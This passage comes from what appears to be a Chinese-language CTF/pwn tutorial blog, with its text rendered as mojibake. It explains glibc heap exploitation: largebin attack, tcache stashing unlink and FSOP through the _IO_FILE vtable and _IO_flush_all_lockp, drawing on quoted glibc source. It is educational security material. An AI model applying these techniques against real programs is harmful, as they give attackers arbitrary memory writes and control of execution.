class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//critical1!!!</span></span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//critical2!!!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËØ•Êìç‰ΩúÂÆûÈôÖ‰∏äÂÆåÊàê‰∫Ü‰∏Ä‰∏™ÁÆÄÂçïÁöÑÂ∞ÜchunkÂä†ÂÖ•ÂèåÂêëÈìæË°®ÁöÑËøáÁ®ãÔºåÂèØ‰ª•ÈÄêÊ≠•ÊâãÂä®Ê®°ÊãüÂä†Ê∑±ÁêÜËß£</p><p>ËØ•Êìç‰ΩúÁº∫Â§±ÂØπÂèåÂêëÈìæË°®ÂÆåÊï¥ÊÄßÁöÑÊ£ÄÊü•ÔºåÂèØ‰ª•Âä†‰ª•Âà©Áî®</p><p>Êàë‰ª¨ÂÅáËÆælargebin‰∏≠‰ªÖÂ≠òÂú®chunk0ÔºåÁé∞Âú®ÂáÜÂ§áÂ∞Üchunk1Âä†ÂÖ•largebinÔºå‰∏îchunk0 &gt; chunk1„ÄÇÊàë‰ª¨Êäächunk0ÁöÑ<code>bk_nextsize</code>‰øÆÊîπ‰∏∫<code>[target-0x20]</code>(Âç≥<code>target</code>ÁõÆÊ†áÂú∞ÂùÄ‰Ωç‰∫é‰ª•<code>[target-0x20]</code>ÂºÄÂ§¥ÁöÑchunkÁöÑ<code>fd_nextsize</code>Â§Ñ)</p><p>‰øÆÊîπÂÆåÊàêÂêéÔºåÊàë‰ª¨Â∞Üchunk1ÂÖ•ÈìæÔºåÈáçÁÇπÂÖ≥Ê≥®‰∏äËø∞‰ª£Á†ÅÁâáÊÆµ‰∏≠Ê≥®ÈáäÁöÑÈÉ®ÂàÜ„ÄÇcritical1Â§Ñ <code>victim-&gt;bk_nextsize = (&amp;target)-4)</code>Ôºåcritical2Â§Ñ <code>(&amp;target)-4)-&gt;fd_nextsize = victim</code>ÔºåÂç≥<code>*target = victim</code>„ÄÇÁõÆÊ†áËææÊàê</p><p>Áî±Ê≠§ÂèØËßÅÔºålargebin attackÁöÑÂà©Áî®Áõ∏ÂΩìÁÆÄÂçïÔºåÂè™ÈúÄ‰∏Ä‰∏™UAFÂç≥ÂèØÂÆå</p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>ÂøòÂÜô‰∫ÜXD</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><p>glibcÂä†ÂÖ•tcacheÂêéÔºåÂΩì‰ªésmallbin‰∏≠ÂèñÂá∫chunkÊó∂ÔºåÂ¶ÇÊûúsmallbin‰∏≠‰ªçÊúâchunk‰∏îÂØπÂ∫îtcacheÊú™Â°´Êª°ÔºåÂàô‰ºöÂ∞Üsmallbin‰∏≠Ââ©‰ΩôchunkÂÖ®ÈÉ®‰æùÊ¨°ÊîæÂÖ•ÂØπÂ∫îtcache‰∏≠„ÄÇËÄåÂú®ËØ•ËøáÁ®ã‰∏≠ÔºåÂè™ÂØπ‰ªésmallbin‰∏≠ÂèñÂá∫ÁöÑchunkËøõË°å‰∫ÜÂÆåÊï¥ÊÄßÊ£ÄÊü•ÔºåÂêéÁª≠chunkÂùáÊ≤°Êúâ„ÄÇËØ•ÊâãÊ≥ïÂàôÂà©Áî®‰∫ÜËøô‰∏ÄÊºèÊ¥û„ÄÇ</p><p>‰ª•‰∏ã‰∏∫Â∞Üsmallbin‰∏≠chunkÊîæÂÖ•tcacheÁöÑ‰ª£Á†ÅÁâáÊÆµÔºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="comment">//Âè™ÂØπÁ¨¨‰∏Ä‰∏™chunkËøõË°å‰∫ÜÂÆåÊï¥ÊÄßÊ£ÄÊü•ÔºåÂêéÈù¢ËøõÂÖ•Âæ™ÁéØÔºåÊó†Ê£ÄÊü•</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// Ëé∑Âèñ small bin ‰∏≠ÂÄíÊï∞Á¨¨‰∫å‰∏™ chunk „ÄÇ</span></span><br><span class="line">bck = tc_victim-&gt;bk;</span><br><span class="line">...</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br><span class="line"><span class="comment">//Â∞ÜÂÖ∂ÊîæÂÖ•Âà∞Tcache‰∏≠</span></span><br><span class="line">tcache_put (tc_victim, tc_idx);</span><br></pre></td></tr></table></figure><p>ÂÅáËÆæsmallbin‰∏≠Âè™Â≠òÂú®‰∏§‰∏™chunkÔºåÂÖàÂÖ•ÁöÑ‰∏∫chunk0ÔºåÂêéÂÖ•ÁöÑ‰∏∫chunk1ÔºåÊ†πÊçÆsmallbinÁöÑ<strong>FIFO</strong>ÂéüÂàôÔºåÂèñÂá∫Êó∂ÂÖàÂèñÂá∫chunk0</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811170105495.png" alt="image-20230811170105495"></p><p>ÂêåÊó∂‰ª§ÂØπÂ∫îÂ§ßÂ∞èÁöÑtcache‰∏≠Â∑≤Â°´ÂÖ•5‰∏™chunk</p><p>Ê≠§Êó∂Â∞Üchunk1ÁöÑ<code>bk</code>‰Ωç‰øÆÊîπ‰∏∫ÁõÆÊ†áÂú∞ÂùÄ<code>target</code>Ôºà‰∏çÁ†¥Âùè<code>fd</code>ÔºâÔºåÂπ∂Âà©Áî®ÂÖ∂‰ªñÊâãÊ≥ï‰ΩøÂæó<code>[target+0x8]</code>Â§Ñ‰∏∫‰∏Ä‰∏™ÊåáÂêë<strong>ÂèØÂÜôÂÜÖÂ≠ò</strong>ÁöÑÊåáÈíà„ÄÇÊää<code>target</code>Áúã‰Ωú‰∏Ä‰∏™chunkÁöÑÁî®Êà∑ÊåáÈíàÔºåÂàô<code>[target+0x8]</code>‰∏∫<code>bk</code>‰Ωç„ÄÇÊ≠§Â§Ñ‰ª§ÂÖ∂ÂèØÂÜôÊòØÂõ†‰∏∫ËøõË°åËØ•ÊîªÂáªÊó∂‰ºöÂêëËØ•ÊåáÈíàÊåáÂêëÁöÑÂú∞ÂùÄÂ§ÑÂÜô‰∏Ä‰∏™ÂÄºÔºåÂ¶ÇÊûú‰∏çÂèØÂÜôÁöÑËØùÁ®ãÂ∫è‰ºöÊä•Èîô„ÄÇÁî®largebin attackÂ∞ÜÊ≠§Â§ÑË¶ÜÁõñ‰∏∫ÂèØÂÜôÁöÑÂ†ÜÂú∞ÂùÄÊòØ‰∏ÄÁßçÂ∏∏ËßÅÊìç‰Ωú</p><p>Ê≠§Êó∂ÔºåÊàë‰ª¨Áî®<code>calloc</code>ÂáΩÊï∞Â∞Üchunk0Áî≥ËØ∑Âá∫Êù•„ÄÇ<code>calloc</code>ÂÖ∑ÊúâË∑≥ËøátcacheÁî≥ËØ∑chunkÁöÑÊÄßË¥®ÔºåÊâÄ‰ª•Ê≠§Â§ÑÂè™ËÉΩÁî®<code>calloc</code>„ÄÇ‰πãÂêéchunk1‰ºöÂä†ÂÖ•tcacheÔºåchunk1ÁöÑbkÊåáÂêëÁöÑ<code>target</code>‰πü‰ºöÂä†ÂÖ•tcache„ÄÇÂ¶ÇÊûúÊàë‰ª¨‰ΩøÁî®<code>malloc</code>ÔºåÊ†πÊçÆtcache <strong>LIFO</strong>ÁöÑÊÄßË¥®ÔºåÂ∞±ËÉΩÂ∞Ü<code>target</code>Áî≥ËØ∑Âá∫Êù•„ÄÇ</p><h1 id="IOFILEÂèäÁõ∏ÂÖ≥ÁªìÊûÑ"><a href="#IOFILEÂèäÁõ∏ÂÖ≥ÁªìÊûÑ" class="headerlink" title="IOFILEÂèäÁõ∏ÂÖ≥ÁªìÊûÑ"></a>IOFILEÂèäÁõ∏ÂÖ≥ÁªìÊûÑ</h1><h2 id="IO-FILE-PLUS"><a href="#IO-FILE-PLUS" class="headerlink" title="_IO_FILE_PLUS"></a>_IO_FILE_PLUS</h2><p>Á®ãÂ∫èÂú®ËøõË°å<strong>IOÊìç‰Ωú</strong>Êó∂Ôºå‰ºöÁî®Âà∞IOFILEÁõ∏ÂÖ≥ÁöÑÁªìÊûÑ„ÄÇ‰æãÂ¶Ç‰ºóÊâÄÂë®Áü•ÁöÑ<code>stdin</code>„ÄÅ<code>stdout</code>„ÄÅ<code>stderr</code>ÔºåÈÉΩÊòØÊåáÂêëIOÁªìÊûÑ‰ΩìÁöÑÊåáÈíà„ÄÇÂΩìÊâìÂºÄ‰∏Ä‰∏™Êñá‰ª∂Êó∂ÔºåÁ®ãÂ∫èÈúÄË¶ÅËÆ∞ÂΩïÊñá‰ª∂ÁöÑËæìÂÖ•ËæìÂá∫ÁºìÂÜ≤Âå∫Á≠âÂÜÖÂÆπÔºå‰∫éÊòØÈúÄË¶Å‰∏Ä‰∏™<code>_IO_FILE</code>ÁªìÊûÑ‰ΩìËøõË°åËÆ∞ÂΩï„ÄÇÈô§Ê≠§‰πãÂ§ñÔºåÂØπÊñá‰ª∂ËøõË°åÁöÑÂêÑÁßçÊìç‰ΩúÂΩ¢Êàê‰∫Ü‰∏ÄÂº†Âº†ÂáΩÊï∞ËôöË°®ÔºåÊñá‰ª∂ÈúÄË¶Å‰∏Ä‰∏™ÊåáÈíàËÆ∞ÂΩïÂØπÂ∫îÁöÑÂáΩÊï∞ËôöË°®ÔºåËØ•ÊåáÈíàË¢´ÂÆö‰πâ‰∏∫<code>_IO_jump_t</code>Á±ªÂûã„ÄÇ<code>_IO_FILE</code> ÁªìÊûÑ‰ΩìÂíåËôöË°®ÊåáÈíà<code>_IO_jump_t</code>ÂΩ¢Êàê‰∫Ü‰∏Ä‰∏™Áß∞‰∏∫<code>_IO_FILE_plus</code>ÁöÑÁªìÊûÑ‰ΩìÔºåÂÆÉÁöÑÂÆö‰πâÊòØËøôÊ†∑ÁöÑÔºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Â∏∏ËßÅÁöÑ<code>_IO_FILE_plus</code>ÁªìÊûÑ‰ΩìÊúâ<code>_IO_2_1_stderr</code>„ÄÅ<code>_IO_2_1_stdout</code>„ÄÅ<code>_IO_2_1_stdin</code>ÔºåÂâçÈù¢ÊèêÂà∞ÁöÑ<code>stdin</code>Á≠âÂ∞±ÊòØÊåáÂêëËøô‰∫õÂØπÂ∫î<code>_IO_FILE_plus</code>ÁªìÊûÑ‰ΩìÁöÑÊåáÈíà</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811172846782.png" alt="image-20230811172846782"></p><p>ÂèØ‰ª•ÈÄöËøágdbÁöÑ<code>p</code>Êåá‰ª§Êü•Áúã</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173045845.png" alt="image-20230811173045845"></p><p>Ê≠§Â§ñÔºåÂ≠òÂú®‰∏Ä‰∏™ÊåáÂêë<code>_IO_FILE_plus</code>ÁªìÊûÑ‰ΩìÁöÑ<code>_IO_list_all</code>ÊåáÈíàÔºåÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÊåáÂêë<code>_IO_2_1_stderr</code></p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173332086.png" alt="image-20230811173332086"></p><p>ÊØè‰∏™<code>_IO_FILE</code>ÁªìÊûÑ‰Ωì‰∏≠ÈÉΩÂ≠òÂú®‰∏Ä‰∏™<code>_chain</code>ÊåáÈíàÔºåÊåáÂêë‰∏ã‰∏Ä‰∏™<code>_IO_FILE_plus</code>ÁªìÊûÑ‰Ωì„ÄÇÈÄöÂ∏∏ÊÉÖÂÜµÔºåË°®Á§∫Â¶Ç‰∏ãÔºö</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173606405.png" alt="image-20230811173606405"></p><p>ÂΩìÊúâÊñ∞Êñá‰ª∂Ë¢´ÊâìÂºÄÊó∂ÔºåÂØπÂ∫îÁöÑ<code>_IO_FILE_plus</code>ÁªìÊûÑ‰ΩìÂ∞±‰ºöË¢´ÊèíÂÖ•Âà∞<strong>ÈìæÈ¶ñ</strong>„ÄÇ</p><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h2><p>‰ª•‰∏ãÊòØ<code>_IO_FILE</code>ÁªìÊûÑ‰ΩìÁöÑÊ∫êÁ†ÅÔºåÁúãËµ∑Êù•ÂèØËÉΩÊúâ‰∫õÂ§¥Â§ßÔºåÈáçÁÇπÈúÄË¶Å‰∫ÜËß£ÁöÑÊòØÂá†‰∏™<strong>ÁºìÂÜ≤Âå∫ÁöÑÊåáÈíà</strong>„ÄÅ<code>_chain</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The tag name of this struct is _IO_FILE to preserve historic</span></span><br><span class="line"><span class="comment">   C++ mangled names for functions taking FILE* arguments.</span></span><br><span class="line"><span class="comment">   That name should not be used in new code.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_FILE_complete</code>ÂèØ‰ª•ÁêÜËß£‰∏∫<code>_IO_FILE</code>ÁöÑË±™ÂçéÂä†ÈïøÁâàÔºåÂÖ∂‰∏≠ÁöÑ<code>_wide_data</code>ÈúÄË¶ÅÂÖ≥Ê≥®‰∏Ä‰∏ãÔºåÊúâ‰∫õÊâãÊ≥ï‰ºöÁî®Âà∞„ÄÇ</p><h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><p><code>vtable</code>ÊòØ‰∏Ä‰∏™ÊåáÂêë<code>_IO_jump_t</code>ÁªìÊûÑ‰ΩìÁöÑÊåáÈíà„ÄÇÂΩìÊâìÂºÄ‰∏Ä‰∏™Êñá‰ª∂Êó∂ÔºåÁõ∏Â∫îÁöÑ <code>_IO_FILE</code> ÁªìÊûÑ‰Ωì‰ºöË¢´ÂàõÂª∫ÔºåÂπ∂Â∞ÜÂÖ∂<code> vtable</code> Â≠óÊÆµÊåáÂêëÂØπÂ∫îÊñá‰ª∂Á±ªÂûãÁöÑ <code>_IO_jump_t</code> ÁªìÊûÑ‰ΩìÁöÑÂú∞ÂùÄ„ÄÇËøôÊ†∑ÔºåÂΩìÈúÄË¶ÅÊâßË°åÊñá‰ª∂Êìç‰ΩúÊó∂ÔºåÂèØ‰ª•ÈÄöËøá <code>_IO_FILE</code> ÁªìÊûÑ‰Ωì‰∏≠ÁöÑ <code>vtable</code> Â≠óÊÆµËé∑ÂèñÂà∞Áõ∏Â∫îÁöÑ <code>_IO_jump_t</code> ÁªìÊûÑ‰ΩìÔºåÂπ∂ÈÄöËøáÂÖ∂‰∏≠ÁöÑÂáΩÊï∞ÊåáÈíàË∞ÉÁî®Áõ∏Â∫îÁöÑÊñá‰ª∂Êìç‰ΩúÂáΩÊï∞„ÄÇ</p><p>ÈÄöÂ∏∏Ôºå‰∏Ä‰∏™<code>_IO_jump_t</code> ÁªìÊûÑ‰ΩìÂåÖÂê´‰ª•‰∏ãÂáΩÊï∞ÊåáÈíà</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Ê≥®ÊÑèÔºåÁ®ãÂ∫è‰∏≠Â≠òÂú®ÂæàÂ§ö<code>_IO_jump_t</code>ÁªìÊûÑ‰ΩìÔºå‰∏çÂêåÁöÑ<code>_IO_FILE_plus</code>ÂèØËÉΩÈááÁî®‰∏çÂêåÁöÑ<code>_IO_jump_t</code>Ôºå‰æãÂ¶Çstdin&#x2F;stdout&#x2F;stderr‰ΩøÁî®<code>_IO_file_jumps</code>ÔºåÂèØ‰ª•ÈÄöËøágdbÊü•Áúã</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811182023451.png" alt="image-20230811182023451"></p><h1 id="FSOPÂü∫Á°Ä"><a href="#FSOPÂü∫Á°Ä" class="headerlink" title="FSOPÂü∫Á°Ä"></a>FSOPÂü∫Á°Ä</h1><p><strong>FSOP</strong>(File Stream Oriented ProgrammingÊòØÈíàÂØπ<code>_IO_FILE</code>ÁªìÊûÑ‰Ωì‰∏éIOÊìç‰ΩúÁöÑÊîªÂáªÊñπÂºè</p><p>ÈÄöÂ∏∏ÂèØ‰ª•ÂàÜ‰∏∫‰∏§‰∏™Ê≠•È™§Ôºö<strong>Âä´ÊåÅ</strong>Âπ∂<strong>‰º™ÈÄ†</strong>IOÁªìÊûÑ‰Ωì„ÄÅ<strong>Ëß¶Âèë</strong>IOÊµÅ</p><p>Âõ†‰∏∫Ëß¶ÂèëIOÊµÅÁöÑÊñπÂºèÂΩ±ÂìçÁ®ãÂ∫èËøõÂÖ•ÁöÑIOÁªìÊûÑ‰ΩìÔºåÊâÄ‰ª•Êàë‰ª¨ÂÖàËÆ≤Â¶Ç‰ΩïËß¶ÂèëIOÊµÅ</p><h2 id="Ëß¶ÂèëIOÊµÅ"><a href="#Ëß¶ÂèëIOÊµÅ" class="headerlink" title="Ëß¶ÂèëIOÊµÅ"></a>Ëß¶ÂèëIOÊµÅ</h2><p>Ëß¶ÂèëIOÊµÅÁöÑÊñπÂºè‰∏ªË¶ÅÂàÜ‰∏∫‰∏§ÁßçÔºö<strong>FSOP</strong>ÁöÑÁªèÂÖ∏ÊñπÂºèÂíå<strong>house of kiwi</strong>ÁöÑÊñπÂºè</p><h3 id="FSOP-IO-flush-all-lockp"><a href="#FSOP-IO-flush-all-lockp" class="headerlink" title="FSOP - _IO_flush_all_lockp()"></a>FSOP - _IO_flush_all_lockp()</h3><p>ËØ•ÂáΩÊï∞ÁöÑË∞ÉÁî®Êúâ‰ª•‰∏ã‰∏âÁßçËß¶ÂèëÊñπÂºèÔºö</p><ol><li><code>libc</code>Ê£ÄÊµãÂà∞<strong>ÂÜÖÂ≠òÈîôËØØ</strong>Ôºå‰ªéËÄåÊâßË°å<code>abort</code>ÂáΩÊï∞Êó∂ÔºàÂú®<code>glibc-2.26</code>Âà†Èô§Ôºâ</li><li>Á®ãÂ∫èÊâßË°å<code>exit</code>ÂáΩÊï∞</li><li>Á®ãÂ∫è‰ªémainÂáΩÊï∞ËøîÂõûÔºàÂêåÊ†∑ÊòØÊâßË°åexitÔºâ</li></ol><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÈ´òÁâàÊú¨‰∏ãÔºåÂü∫Êú¨ÁöÑËß¶ÂèëÊñπÂºèÈÉΩÊòØÈÄöËøá<code>exit</code>ÂáΩÊï∞ÔºåÂÖ∂Ê†àÂõûÊ∫Ø‰∏∫Ôºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">_IO_cleanup ()</span><br><span class="line">__run_exit_handlers (status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="number">0x1</span>)</span><br><span class="line">__GI_exit (status=&lt;optimized out&gt;)</span><br></pre></td></tr></table></figure><p>Â∞±ËÉΩË∞ÉÁî®Âà∞<code>_IO_flush_all_lockp()</code>ÂáΩÊï∞</p><p>ËØ•ÂáΩÊï∞ÁöÑ‰ª£Á†ÅÁâáÊÆµÂ¶Ç‰∏ãÔºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"> </span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span 